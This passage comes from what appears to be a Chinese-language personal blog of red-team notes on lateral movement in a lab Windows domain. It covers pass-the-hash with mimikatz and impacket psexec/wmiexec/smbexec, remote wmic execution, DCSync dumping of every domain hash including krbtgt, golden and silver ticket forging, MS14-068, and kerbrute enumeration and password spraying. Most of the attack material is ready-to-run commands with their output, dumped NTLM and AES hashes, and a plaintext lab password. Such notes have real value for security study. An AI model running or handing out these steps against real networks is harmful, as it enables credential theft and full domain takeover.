plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.188.100\ipc$ Admin123! /user:administrator </span><br><span class="line"></span><br><span class="line">PsExec.exe -accepteula \\192.168.188.100 cmd.exe</span><br><span class="line">or</span><br><span class="line">PsExec.exe -accepteula \\192.168.188.100 ipconfig</span><br></pre></td></tr></table></figure><p>注意要关UAC或者加注册表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem</span><br><span class="line">添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1。</span><br></pre></td></tr></table></figure><p>但我一直是拒绝访问，，，，不知道为啥。。。。。</p><h2 id="PTH-Hash传递攻击，pass-the-hash"><a href="#PTH-Hash传递攻击，pass-the-hash" class="headerlink" title="PTH(Hash传递攻击，pass the hash)"></a>PTH(Hash传递攻击，pass the hash)</h2><p><a href="https://xz.aliyun.com/t/8690">Kerberos相关攻击技巧</a></p><p><a href="https://cloud.tencent.com/developer/article/1829649">Hash传递攻击</a></p><p><a href="https://cloud.tencent.com/developer/article/1752168">内网渗透之命令行渗透 - 渗透红队笔记</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PTH攻击是指攻击者可以通过捕获密码的hash值（无需解密），简单地将其传递来进行身份验证，以此来横向访问其他网络系统。</p><p>攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</p><p>工具：</p><blockquote><p>  <a href="https://github.com/maaaaz/impacket-examples-windows">Github</a></p><p>  <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p></blockquote><h3 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h3><p>使用mimikatz抓取密码或者hash，其实如果在域内主机可以获取到明文密码，我们可以使用明文密码进行登录，但是在很多情况下，由于域内密码复杂度要求，我们可能无法获取到域内主机明文密码，这就导致我们必须使用hash传递来获取域控权限。</p><p>需要本地管理员权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  <span class="comment"># 查看是否有debug权限</span></span><br><span class="line">token::elevate    <span class="comment"># 提升到最高权限</span></span><br><span class="line">sekurlsa::logonpasswords full  <span class="comment">#抓取所有的密码,如果密码复杂则只会抓到hash</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318183012610.png" alt="image-20220318183012610"></p><p>查看域控文件目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:administrator /domain:ghost /ntlm:520126a03f5d5a8d836f1c4f34ede7ce</span></span><br><span class="line">user    : administrator</span><br><span class="line">domain  : ghost</span><br><span class="line">program : cmd.exe</span><br><span class="line">impers. : no</span><br><span class="line">NTLM    : 520126a03f5d5a8d836f1c4f34ede7ce</span><br><span class="line">  |  PID  6968</span><br><span class="line">  |  TID  4008</span><br><span class="line">  |  LSA Process is now R/W</span><br><span class="line">  |  LUID 0 ; 22668132 (00000000:0159e364)</span><br><span class="line">  \_ msv1_0   - data copy @ 000001F6C8FFE6F0 : OK !</span><br><span class="line">  \_ kerberos - data copy @ 000001F6C8E5ED28</span><br><span class="line">   \_ des_cbc_md4       -&gt; null</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ des_cbc_md4       OK</span><br><span class="line">   \_ *Password replace @ 000001F6C8465DC8 (32) -&gt; null</span><br></pre></td></tr></table></figure><p>会弹出来个cmd，这个cmd是域内主机的cmd，不是域控的cmd。</p><p>可以直接连接该主机、查看目录文件等操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">连接域控：net use \\192.168.188.100</span><br><span class="line">查看文件目录：dir \\192.168.188.100\c$</span><br></pre></td></tr></table></figure><p>查看目标开放的共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;net view \\192.168.188.100</span><br><span class="line">在 \\192.168.188.100 的共享资源</span><br><span class="line">共享名    类型  使用为  注释</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NETLOGON  Disk          Logon server share</span><br><span class="line">SYSVOL    Disk          Logon server share</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>只有域控才会有下面两个共享目录：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NETLOGON      Disk          Logon server share</span><br><span class="line">SYSVOL        Disk          Logon server share</span><br></pre></td></tr></table></figure><p>删除链接</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /del /y</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\Users&gt;net use \\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /del /y</span><br><span class="line">\\<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> 已经删除。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>copy 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#把当前机器C盘下的1.txt文件拷贝到目标桌面</span><br><span class="line">copy 1.txt \\192.168.188.100\c$\users\administrator\desktop\</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185354157.png" alt="image-20220318185354157"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 吧目标机器上的pass.txt拷贝到本地</span><br><span class="line">coyp \\192.168.188.100\c$\users\administrator\desktop\pass.txt</span><br></pre></td></tr></table></figure><p>查看内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看目标桌面1.txt文件内容</span><br><span class="line">type \\192.168.188.100\c$\users\administrator\desktop\1.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185531211.png" alt="image-20220318185531211"></p><p>除此之外还有psexec，wmiexec，rpcdump等等，（之后再写）</p><p><a href="https://cloud.tencent.com/developer/article/1829649">PTH(Pass The Hash)哈希传递攻击手法与防范</a></p><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>这里的和上面的那个psexec不一样，这个是impacket套装里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe Administrator@192.168.188.100 -hashes 00000000000000000000000000000000:520126a03f5d5a8d836f1c4f34ede7ce</span><br><span class="line">or</span><br><span class="line">psexec.exe Administrator@192.168.188.100 -hashes :520126a03f5d5a8d836f1c4f34ede7ce</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319161231967.png" alt="image-20220319161231967"></p><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100 &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160157984.png" alt="image-20220319160157984"></p><h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe  -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160656572.png" alt="image-20220319160656572"></p><h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><blockquote><p>  WMI以CIMOM为基础，CIMOM即<a href="https://baike.baidu.com/item/%E5%85%AC%E5%85%B1%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9E%8B/2719581">公共信息模型</a><a href="https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E7%AE%A1%E7%90%86%E5%99%A8/21508570">对象管理器</a>（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和<a href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E7%A8%8B%E5%BA%8F/1265903">脚本程序</a>提供了一个访问操作系统构成单元的公共接口。</p></blockquote><h4 id="查询进程信息"><a href="#查询进程信息" class="headerlink" title="查询进程信息"></a>查询进程信息</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /user:administrator /password:Admin123! process list brief</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165203798.png" alt="image-20220319165203798"></p><h4 id="远程创建进程"><a href="#远程创建进程" class="headerlink" title="远程创建进程"></a>远程创建进程</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /user:administrator /password:Admin123! process call create <span class="string">&quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165338212.png" alt="image-20220319165338212"></p><h4 id="wmiexec-1"><a href="#wmiexec-1" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>上面写过了。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165549388.png" alt="image-20220319165549388"></p><h2 id="PTT-Pass-the-ticket"><a href="#PTT-Pass-the-ticket" class="headerlink" title="PTT(Pass the ticket)"></a>PTT(Pass the ticket)</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>Golden Ticket（下面称为金票）是通过伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p>条件：</p><p>1、域名称 </p><p>2、域的 SID 值 </p><p>3、域的 KRBTGT 账号的 HASH </p><p>4、伪造任意用户名</p><p>得到kratgr的hash：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ghost.com /all /csv</span></span><br><span class="line">[DC] <span class="string">&#x27;ghost.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;WIN-4JS3YOGGQ2T.ghost.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;ghost.com&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">1001    WIN-4JS3YOGGQ2T$        b443a0863dfb6f394b46983d0d795fb6        532480</span><br><span class="line">1104    DM_WIN2003$     13e19dba1a1ad144d9bced3585afa9a9        4096</span><br><span class="line">500     Administrator   520126a03f5d5a8d836f1c4f34ede7ce        512</span><br><span class="line">1000    DC      520126a03f5d5a8d836f1c4f34ede7ce        544</span><br><span class="line">502     krbtgt  a5269d41b184a97adc9b991f2ee21f12        514</span><br><span class="line">1105    DM_WINXP$       5469d97f136d8662f65377f3ea8e4835        528384</span><br><span class="line">1107    yutao   520126a03f5d5a8d836f1c4f34ede7ce        66048</span><br><span class="line">1109    yutaowin10      520126a03f5d5a8d836f1c4f34ede7ce        66048</span><br><span class="line">1108    DM_WIN10$       bc3746c7020c2c97eac589107a57790f        4096</span><br><span class="line">1110    DM_WIN10_2$     aa5910b813ef7a8784d7522dad99ee07        4096</span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ghost.com /user:krbtgt</span></span><br><span class="line">[DC] <span class="string">&#x27;ghost.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;WIN-4JS3YOGGQ2T.ghost.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] <span class="string">&#x27;krbtgt&#x27;</span> will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 2022/3/16 18:25:33</span><br><span class="line">Object Security ID   : S-1-5-21-1238213221-2393825874-2881136966-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line">    ntlm- 0: a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line">    lm  - 0: dadc5e38f4551dd9bd6f8673528f3d6a</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : GHOST.COMkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : da6374753cb6f5e191265a283115ced1fe1d2c5e5091d60093903cb90ef67fb7</span><br><span class="line">      aes128_hmac       (4096) : 777c080c663f51196b554d5348ee8123</span><br><span class="line">      des_cbc_md5       (4096) : 5e83f83776ae8a1a</span><br><span class="line">      des_cbc_crc       (4096) : 5e83f83776ae8a1a</span><br><span class="line">      rc4_plain         (4096) : a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : GHOST.COMkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 5e83f83776ae8a1a</span><br><span class="line">      des_cbc_crc       : 5e83f83776ae8a1a</span><br><span class="line">      rc4_plain         : a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    Kerberos-Newer-Keys</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    02  f11fc690746ff0c5017fbb804a5afadb</span><br><span class="line">    03  1284d4bd47f80c75715883ecae93aee3</span><br><span class="line">    04  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    05  f11fc690746ff0c5017fbb804a5afadb</span><br><span class="line">    06  f0858287a155ee5ea15271dca0c480c3</span><br><span class="line">    07  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    08  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    09  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    10  053d15785d6b8e58659321a0c0bbe730</span><br><span class="line">    11  910f26088b80677ff20523ae2f570ad2</span><br><span class="line">    12  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    13  37dca035e5d9ce4b7539b40dd4a3b711</span><br><span class="line">    14  910f26088b80677ff20523ae2f570ad2</span><br><span class="line">    15  c01bc6cc7073767ae9332d6948012efb</span><br><span class="line">    16  c01bc6cc7073767ae9332d6948012efb</span><br><span class="line">    17  5bef1b58b30a684217b555a9c694b018</span><br><span class="line">    18  c7ddf9a29f31081a0c2c59f0ba887591</span><br><span class="line">    19  6ed3c0509d5ed0b11be6d3cb7d9eec89</span><br><span class="line">    20  2230919d6c19fdc4794a4d4cbf08cbcc</span><br><span class="line">    21  f5e434234d81d0ba2362f17a8b4a61a0</span><br><span class="line">    22  f5e434234d81d0ba2362f17a8b4a61a0</span><br><span class="line">    23  4cf7197a9331618814144057e85b32b6</span><br><span class="line">    24  ada6252d89f49e2cc822fb2545c8a4ac</span><br><span class="line">    25  ada6252d89f49e2cc822fb2545c8a4ac</span><br><span class="line">    26  55c19bbc0da0e9ae00a609c755da8ef5</span><br><span class="line">    27  9df3396f69d865ef7b7fabdd30e5c225</span><br><span class="line">    28  b8685ccf3967652956f90dd8c912dd9f</span><br><span class="line">    29  534307dab20bfd1901a972ed1196c351</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 mimikatz 生成金票生成.kirbi 文件并保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:new_user_gold /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-502 /krbtgt:a5269d41b184a97adc9b991f2ee21f12 /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID 值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt 的 HASH 值</span><br><span class="line">/ticket：生成的票据名称 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200338986.png" alt="image-20220318200338986"></p><p>登录域内普通用户，通过 mimikatz 中的 kerberos::ptt 功能将ticket.kirbi 导入内存中。</p><p>导入票据之前访问域控:</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200449833.png" alt="image-20220318200449833"></p><p>导入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">Ticket(s) purge for current session is OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::ptt C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kirbi</span><br><span class="line"></span><br><span class="line">* File: &#x27;C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kir</span><br></pre></td></tr></table></figure><p>再次访问域控即可成功。</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><p>1.不需要与 KDC 进行交互 </p><p>2.需要 server 的 NTLM hash</p><p>mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318202007613.png" alt="image-20220318202007613"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-500 /target:WIN-4JS3YOGGQ2T.ghost.com /service:cifs /rc4:520126a03f5d5a8d836f1c4f34ede7ce /user:new_user_gold /ptt</span><br><span class="line"></span><br><span class="line">/domain</span><br><span class="line">/sid</span><br><span class="line">/target:目标服务器的域名全称，此处为域控的全称</span><br><span class="line">/service:目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line">/rc4:计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line">/user:要伪造的用户名</span><br></pre></td></tr></table></figure><p>此时可以成功访问域控上的文件共享</p><h3 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h3><h4 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h4><ul><li>  Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>  Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><h4 id="2-加密方式不同"><a href="#2-加密方式不同" class="headerlink" title="2.加密方式不同"></a>2.加密方式不同</h4><ul><li>  Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>  Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h4 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h4><ul><li>  Golden Ticket 的利用过程需要访问域控(KDC)</li><li>  Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>能够将任意一台域机器提升成域控相关权限</p><p>利用条件：</p><ul><li>  小于2012R2的域控没有打KB3011780，高版本默认集成</li><li>  无论工作组、域，高低权限都可以使用生成的票据进行攻击</li><li>  域账户使用时需要klist purge清除票据</li></ul><p>环境：</p><blockquote><p>  域控：2008，192.168.188.100，主机名：WIN-4JS3YOGGQ2T</p><p>  域成员：192.168.188.104 ，yutaowin10 ，Admin123！</p></blockquote><p>获取域用户的sid：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318194110678.png" alt="image-20220318194110678"></p><p>直接生成票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u yutaowin10@ghost.com -s S-1-5-21-1238213221-2393825874-2881136966-1109 -d 192.168.188.100 -p Admin123!</span><br></pre></td></tr></table></figure><p>使用生成的票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_yutaowin10@ghost.com.ccache</span><br></pre></td></tr></table></figure><p>通过域控的主机名访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-4JS3YOGGQ2T\c$</span><br></pre></td></tr></table></figure><h3 id="域外用户枚举"><a href="#域外用户枚举" class="headerlink" title="域外用户枚举"></a>域外用户枚举</h3><p>在域外也能和域进行交互的原因，是利用了kerberos协议认证中的AS-REQ阶段。只要我们能够访问域控88(kerberos服务)端口，就可以通过这种方式去枚举用户名并且进行kerberos协议的暴力破解了！</p><p>Kerbrute使用的是kerberos pre-auth协议，不会产生大量的日志 (4625 - An account failed to log on)，但是会产生以下日志：</p><ul><li>  口令验证成功时产生日志 (4768 - A Kerberos authentication ticket (TGT) was requested)</li><li>  口令验证失败时产生日志 (4771 - Kerberos pre-authentication failed)</li></ul><h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><h5 id="kerbrute-windows-amd64-exe"><a href="#kerbrute-windows-amd64-exe" class="headerlink" title="kerbrute_windows_amd64.exe"></a>kerbrute_windows_amd64.exe</h5><blockquote><p>  <a href="https://github.com/ropnop/kerbrute/releases">kerbrute_windows_amd64.exe</a></p></blockquote><p>在这里我们需要获取dc的ip，域名。将想要爆破的用户放入user.txt表中，这样就可以获取到了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.188.100 -d ghost.com user.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191443842.png" alt="image-20220318191443842"></p><p>之后爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray -d 192.168.188.100 -d 